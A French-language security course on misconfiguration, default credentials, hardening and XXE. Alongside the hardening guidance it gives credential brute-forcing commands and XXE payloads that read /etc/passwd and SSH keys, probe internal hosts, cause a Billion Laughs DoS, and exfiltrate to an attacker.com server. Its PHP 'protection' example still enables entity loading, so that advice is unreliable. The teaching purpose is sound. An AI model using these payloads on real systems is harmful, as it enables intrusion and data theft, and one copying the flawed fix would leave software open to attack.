# Cours : Security Misconfiguration et XXE (XML External Entities)

## Introduction

Cette section couvre :
- **Security Misconfiguration** : Erreurs de configuration de sécurité [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)
- **Default Accounts** : Comptes par défaut non modifiés [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)
- **Missing Hardening** : Absence de durcissement de la sécurité [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)
- **Unnecessary Features** : Fonctionnalités inutiles activées [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)
- **XXE (XML External Entities)** : Exploitation d'entités XML externes [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

***

## Partie 1 : Security Misconfiguration (Mauvaise configuration de sécurité)

### 1.1 Définition

**Security Misconfiguration** : Vulnérabilité résultant d'une **configuration incorrecte ou incomplète** des systèmes, applications, bases de données, serveurs web, ou frameworks. [kiteworks](https://www.kiteworks.com/fr/glossaire/vulnerabilites-liees-a-une-mauvaise-configuration-de-la-securite-risques-impacts-et-prevention/)

**OWASP Top 10 2021** : **A05:2021 – Security Misconfiguration** (5ème position). [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)

**Impact**  : [kiteworks](https://www.kiteworks.com/fr/glossaire/vulnerabilites-liees-a-une-mauvaise-configuration-de-la-securite-risques-impacts-et-prevention/)
- 🔴 **Accès non autorisé** : Exploitation de comptes par défaut
- 🔴 **Divulgation d'informations** : Messages d'erreur détaillés, fichiers de configuration exposés
- 🔴 **Compromission totale** : Services non sécurisés, privilèges excessifs
- 🔴 **Déni de service** : Mauvaise gestion des ressources

### 1.2 Types de Security Misconfiguration

**Les 10 principales erreurs de configuration**  : [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

| Type | Description | Exemple |
|------|-------------|---------|
| **Configurations par défaut** | Logiciels/applications non durcis | Admin/admin, services actifs |
| **Mauvaise séparation privilèges** | User/admin non séparés | Utilisateurs avec droits admin |
| **Absence de segmentation réseau** | Tout accessible depuis partout | Pas de VLAN, pas de firewall interne |
| **Gestion insuffisante des correctifs** | Systèmes non patchés | CVE connues non corrigées |
| **Contournement des contrôles d'accès** | Accès directs non protégés | URL admin non vérifiées |
| **MFA faible** | 2FA mal configurée | SMS comme seul facteur |
| **ACL insuffisantes** | Partages réseau ouverts | Everyone : Full Control |
| **Hygiène des identifiants médiocre** | Mots de passe faibles/réutilisés | Password123, admin/admin |
| **Exécution de code non restreinte** | Scripts/uploads non validés | PHP exec() sans restriction |
| **Messages d'erreur verbeux** | Stack traces exposées | Chemins serveur, versions révélés |

***

## Partie 2 : Default Accounts (Comptes par défaut)

### 2.1 Problème des comptes par défaut

**Default Accounts** : Comptes créés automatiquement lors de l'installation d'un système/application avec des **credentials prévisibles**. [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)

**Exemples courants** :

| Système/Application | Username | Password | Impact |
|---------------------|----------|----------|--------|
| **WordPress** | admin | admin | Accès admin complet |
| **MySQL** | root | (vide) | Contrôle DB |
| **Tomcat** | tomcat | tomcat | Déploiement d'applications |
| **RabbitMQ** | guest | guest | Accès message queue |
| **Jenkins** | admin | password | Exécution de code |
| **Router/Switches** | admin | admin | Contrôle réseau |
| **PostgreSQL** | postgres | postgres | Contrôle DB |
| **MongoDB** | admin | (aucune auth) | Accès DB |

### 2.2 Exploitation des comptes par défaut

**Scénario d'attaque**  : [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

```
1. Scanner réseau pour identifier services
   nmap -sV 192.168.1.0/24

2. Identifier versions et services
   - MySQL 5.7 (port 3306)
   - Tomcat 9 (port 8080)
   - WordPress (port 80)

3. Tester credentials par défaut
   mysql -u root -p
   # Password: (vide)

4. Accès obtenu
   mysql> show databases;
```

**Base de données de credentials** :

- **DefaultCreds-cheat-sheet** : https://github.com/ihebski/DefaultCreds-cheat-sheet
- **SecLists** : `/usr/share/seclists/Passwords/Default-Credentials/`

**Exemple exploitation** :

```bash
# Hydra pour brute force credentials par défaut
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt \
  ssh://192.168.1.100

# -C : Combo file (username:password)
```

### 2.3 Détection et prévention

**Détection**  : [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

```bash
# Nmap avec scripts NSE
nmap -p 3306,5432,8080,8443 --script=default-accounts 192.168.1.100

# Metasploit
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
set RHOSTS 192.168.1.100
run
```

**Prévention**  : [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)

1. ✅ **Supprimer les comptes par défaut** lors de l'installation
2. ✅ **Changer immédiatement les mots de passe** par défaut
3. ✅ **Désactiver les comptes inutilisés** (guest, test, demo)
4. ✅ **Forcer le changement de mot de passe** au premier login
5. ✅ **Auditer régulièrement** les comptes existants

**Exemple WordPress** :

```bash
# Mauvais
Username: admin
Password: admin

# Bon
Username: j0hn_d03_2026
Password: Xk9#mP2$qL7@wZ4!vN8
```

***

## Partie 3 : Missing Hardening (Absence de durcissement)

### 3.1 Définition

**Hardening** : Processus de **renforcement de la sécurité** d'un système en désactivant les fonctionnalités inutiles, en appliquant les meilleures pratiques, et en réduisant la surface d'attaque. [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)

**Missing Hardening** : Systèmes/applications déployés **sans configuration de sécurité appropriée**. [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

### 3.2 Exemples de hardening manquant

**Serveur Web (Apache/Nginx)**  : [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

| Problème | Impact | Hardening |
|----------|--------|-----------|
| **Directory listing** activé | Énumération fichiers | `Options -Indexes` |
| **Server signature** exposée | Version révélée | `ServerTokens Prod` |
| **Méthodes HTTP dangereuses** | TRACE, DELETE, PUT | `TraceEnable Off` |
| **Headers sécurité absents** | XSS, Clickjacking | `X-Frame-Options: DENY` |

**Base de données (MySQL)**  : [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

```sql
-- Mauvais : Port exposé publiquement
bind-address = 0.0.0.0

-- Bon : Écoute locale uniquement
bind-address = 127.0.0.1

-- Mauvais : Connexion root sans mot de passe
mysql -u root

-- Bon : Mot de passe fort + désactiver root remote
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
```

**Système d'exploitation (Linux)**  : [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

```bash
# Désactiver services inutiles
systemctl disable telnet
systemctl disable rsh
systemctl disable rlogin

# Firewall par défaut DENY
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Désactiver IPv6 si non utilisé
sysctl -w net.ipv6.conf.all.disable_ipv6=1
```

### 3.3 Checklists de hardening

**CIS Benchmarks** (Center for Internet Security) :
- CIS Apache HTTP Server 2.4 Benchmark
- CIS MySQL 8 Benchmark
- CIS Ubuntu Linux 22.04 Benchmark

**Exemple : Apache hardening**  : [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

```apache
# Cacher version et OS
ServerTokens Prod
ServerSignature Off

# Désactiver directory listing
<Directory /var/www/html>
    Options -Indexes
</Directory>

# Headers de sécurité
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000"

# Désactiver TRACE
TraceEnable Off

# Limiter méthodes HTTP
<LimitExcept GET POST>
    deny from all
</LimitExcept>
```

***

## Partie 4 : Unnecessary Features (Fonctionnalités inutiles)

### 4.1 Problème des fonctionnalités inutiles

**Unnecessary Features** : Services, modules, ports, applications, ou comptes **activés par défaut** mais **non nécessaires** pour le fonctionnement de l'application. [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)

**Principe de sécurité** : **Réduire la surface d'attaque** en désactivant tout ce qui n'est pas strictement nécessaire. [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

### 4.2 Exemples de fonctionnalités inutiles

**Serveur Web**  : [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)

```apache
# Modules Apache à désactiver si non utilisés
a2dismod autoindex   # Directory listing
a2dismod status      # Server status page
a2dismod userdir     # User home directories
a2dismod cgi         # CGI scripts (si PHP-FPM utilisé)
```

**PHP**  : [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)

```ini
; php.ini - Désactiver fonctions dangereuses
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

; Cacher version PHP
expose_php = Off

; Désactiver remote file inclusion
allow_url_fopen = Off
allow_url_include = Off
```

**WordPress**  : [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)

```php
// wp-config.php - Désactiver éditeur de fichiers
define('DISALLOW_FILE_EDIT', true);

// Désactiver XML-RPC (si non utilisé)
add_filter('xmlrpc_enabled', '__return_false');

// Désactiver REST API pour utilisateurs non authentifiés
add_filter('rest_authentication_errors', function($result) {
    if (!is_user_logged_in()) {
        return new WP_Error('rest_disabled', 'API REST désactivée', array('status' => 401));
    }
    return $result;
});
```

**Ports/Services inutilisés**  : [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)

```bash
# Lister services actifs
systemctl list-units --type=service --state=running

# Désactiver services inutiles
systemctl disable bluetooth
systemctl disable cups    # Impression
systemctl disable avahi-daemon  # mDNS
systemctl stop bluetooth cups avahi-daemon

# Fermer ports inutiles
iptables -A INPUT -p tcp --dport 23 -j DROP   # Telnet
iptables -A INPUT -p tcp --dport 21 -j DROP   # FTP
iptables -A INPUT -p tcp --dport 139 -j DROP  # SMB
```

### 4.3 Exemple : XXE activé par défaut

**Problème** : Les parseurs XML ont souvent les **entités externes activées par défaut**, créant une vulnérabilité XXE. [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

**Fonctionnalité inutile** : **External Entity Processing** (si l'application n'en a pas besoin). [webguard-agency](https://webguard-agency.fr/audit/revue-securite-code/xml-external-entities-xxe/index.html)

**Solution** : Désactiver explicitement les entités externes. [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

***

## Partie 5 : XXE (XML External Entities)

### 5.1 Définition de XXE

**XXE (XML External Entities)** : Vulnérabilité permettant à un attaquant d'**exploiter un parseur XML mal configuré** pour lire des fichiers locaux, effectuer des requêtes SSRF, ou provoquer un déni de service. [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

**OWASP Top 10** : Faisait partie de **A04:2017 – XML External Entities (XXE)** (fusionné dans Injection en 2021).

**Impact**  : [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)
- 🔴 **Lecture de fichiers sensibles** : `/etc/passwd`, config files, clés SSH
- 🔴 **SSRF** : Requêtes vers réseau interne
- 🔴 **Exfiltration de données** : Vol de DB, code source
- 🔴 **Déni de service** : Billion Laughs Attack

### 5.2 Fonctionnement de XML et des entités

**XML (eXtensible Markup Language)** : Langage de balisage permettant de **définir ses propres balises**. [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

**Exemple XML basique** :

```xml
<?xml version="1.0"?>
<user>
    <name>John Doe</name>
    <email>john@example.com</email>
</user>
```

**DTD (Document Type Definition)** : Définit la structure et les **entités** d'un document XML. [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

**Entités internes** :

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY company "Acme Corp">
  <!ENTITY slogan "Innovation at its finest">
]>
<message>
    <greeting>Welcome to &company;!</greeting>
    <tagline>&slogan;</tagline>
</message>
```

**Résultat après parsing** :

```xml
<message>
    <greeting>Welcome to Acme Corp!</greeting>
    <tagline>Innovation at its finest!</tagline>
</message>
```

**Entités externes (SYSTEM)**  : [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY external SYSTEM "file:///etc/passwd">
]>
<message>
    <content>&external;</content>
</message>
```

**Résultat après parsing** : Le contenu de `/etc/passwd` est inclus dans `<content>`. [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

### 5.3 Exploitation XXE - Lecture de fichiers

**Scénario** : Application web acceptant upload/parsing de fichiers XML. [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

**Application vulnérable (PHP)** :

```php
<?php
// Récupérer le XML uploadé
$xml = file_get_contents($_FILES['xmlfile']['tmp_name']);

// Parser XML SANS sécurité
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// Afficher le résultat
echo $doc->saveXML();
?>
```

**⚠️ Problème** : `LIBXML_NOENT` et `LIBXML_DTDLOAD` activent les entités externes. [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

**Payload malveillant**  : [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

**Fichier : `exploit.xml`**

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<message>
    <data>&xxe;</data>
</message>
```

**Upload et résultat** :

```xml
<message>
    <data>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    </data>
</message>
```

**Succès** : Contenu de `/etc/passwd` exfiltré ! 🔴

### 5.4 XXE - Autres vecteurs d'attaque

#### a) Lecture de fichiers sensibles [webguard-agency](https://webguard-agency.fr/audit/revue-securite-code/xml-external-entities-xxe/index.html)

**Credentials de base de données** :

```xml
<!DOCTYPE message [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<message><data>&xxe;</data></message>
```

**Clés SSH privées** :

```xml
<!DOCTYPE message [
  <!ENTITY xxe SYSTEM "file:///home/admin/.ssh/id_rsa">
]>
<message><data>&xxe;</data></message>
```

**Code source PHP** (avec wrapper) :

```xml
<!DOCTYPE message [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<message><data>&xxe;</data></message>
```

#### b) SSRF (Server-Side Request Forgery) [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

**Requête vers réseau interne** :

```xml
<!DOCTYPE message [
  <!ENTITY xxe SYSTEM "http://192.168.1.10/admin">
]>
<message><data>&xxe;</data></message>
```

**Port scanning interne** :

```xml
<!DOCTYPE message [
  <!ENTITY xxe SYSTEM "http://localhost:22">
]>
<message><data>&xxe;</data></message>
```

**Résultat** : Si port ouvert → Réponse SSH. Si fermé → Erreur.

#### c) Déni de service : Billion Laughs Attack [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

**Impact** : Expansion exponentielle (10^9 "lol") → Épuisement mémoire → Crash. [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

### 5.5 Détection de XXE

**Conditions pour être vulnérable**  : [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

1. ✅ **Utilisateur peut manipuler XML** : Upload, API, éditeur
2. ✅ **Parseur autorise les entités** : DTD activées
3. ✅ **Parseur résout entités externes** : SYSTEM activé

**Test manuel**  : [webguard-agency](https://webguard-agency.fr/audit/revue-securite-code/xml-external-entities-xxe/index.html)

```xml
<!-- Test 1 : Entité simple -->
<!DOCTYPE test [<!ENTITY test "Hello">]>
<message>&test;</message>

<!-- Si "Hello" affiché → Entités supportées -->

<!-- Test 2 : Entité externe -->
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<message>&xxe;</message>

<!-- Si hostname affiché → XXE confirmé -->
```

**Test automatisé (Burp Suite)** :

```
1. Intercepter requête XML
2. Intruder → Payload type: XXE
3. Tester différents payloads
```

### 5.6 Exploitation avancée : Out-of-Band XXE

**Problème** : Si le résultat n'est pas affiché directement (blind XXE). [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

**Solution** : Exfiltration via requête DNS/HTTP externe. [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

**Payload** :

```xml
<!DOCTYPE message [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<message></message>
```

**Fichier `evil.dtd` sur serveur attaquant** :

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

**Résultat** : `/etc/passwd` envoyé en paramètre GET vers `attacker.com`.

***

## Partie 6 : Protections contre XXE

### 6.1 Désactiver les DTD complètement [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

**PHP (libxml)**  : [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

```php
<?php
// Désactiver entités externes
libxml_disable_entity_loader(true);

// Parser XML
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// Ou mieux : désactiver complètement DTD
$doc->loadXML($xml, 0); // Pas de flags = Pas de DTD
?>
```

**Java (SAX Parser)**  : [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

```java
SAXParserFactory factory = SAXParserFactory.newInstance();

// Désactiver entités externes
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Désactiver DTD
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

SAXParser parser = factory.newSAXParser();
```

**Python (lxml)**  : [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

```python
from lxml import etree

# Créer parser sécurisé
parser = etree.XMLParser(resolve_entities=False, no_network=True)

# Parser XML
tree = etree.fromstring(xml_data, parser)
```

### 6.2 Validation stricte des inputs [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

**Ne JAMAIS utiliser de données utilisateur dans XML**  : [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

```php
// Mauvais
$xml = "<?xml version='1.0'?><user><name>" . $_POST['name'] . "</name></user>";

// Bon : Utiliser une bibliothèque de construction XML
$doc = new DOMDocument();
$user = $doc->createElement('user');
$name = $doc->createElement('name');
$name->textContent = $_POST['name']; // Échappement automatique
$user->appendChild($name);
$doc->appendChild($user);
```

**Validation côté serveur**  : [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)

```php
// Vérifier que XML ne contient pas de DOCTYPE
if (preg_match('/<!DOCTYPE/i', $xml)) {
    die("DOCTYPE non autorisé");
}

// Ou whitelist de balises autorisées
```

### 6.3 Alternatives sécurisées [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

**JSON plutôt que XML**  : [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

```json
{
  "user": {
    "name": "John Doe",
    "email": "john@example.com"
  }
}
```

**Avantages** :
- ✅ Pas de DTD
- ✅ Pas d'entités externes
- ✅ Parsing plus simple et sécurisé

***

## Résumé : Points clés à retenir

1. **Security Misconfiguration** : 5ème vulnérabilité OWASP Top 10 [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)
2. **Default Accounts** : admin/admin, root/(vide), tomcat/tomcat [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)
3. **Supprimer comptes par défaut** : Changer mots de passe immédiatement [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)
4. **Missing Hardening** : Serveurs non durcis (directory listing, version exposée) [solutions-numeriques](https://www.solutions-numeriques.com/les-10-principales-erreurs-de-configuration-et-leurs-consequences/)
5. **CIS Benchmarks** : Checklists de hardening pour Apache, MySQL, Linux
6. **Unnecessary Features** : Désactiver tout ce qui n'est pas nécessaire [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)
7. **disable_functions** : exec, shell_exec, system, passthru [thecodingmachine](https://thecodingmachine.com/securite-web-5-failles-informatiques-a-eviter/)
8. **XXE** : Exploitation d'entités XML externes [webguard-agency](https://webguard-agency.fr/audit/revue-securite-code/xml-external-entities-xxe/index.html)
9. **XML SYSTEM** : `<!ENTITY xxe SYSTEM "file:///etc/passwd">` [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)
10. **Impact XXE** : Lecture fichiers, SSRF, DoS (Billion Laughs) [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)
11. **Protection XXE** : Désactiver DTD, libxml_disable_entity_loader(true) [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)
12. **Parser sécurisé** : resolve_entities=False, no_network=True [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)
13. **Validation XML** : Bloquer DOCTYPE, whitelist balises [developer.android](https://developer.android.com/privacy-and-security/risks/xml-external-entities-injection?hl=fr)
14. **Alternative** : JSON au lieu de XML [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)
15. **Out-of-Band XXE** : Exfiltration via DNS/HTTP externe [vaadata](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)
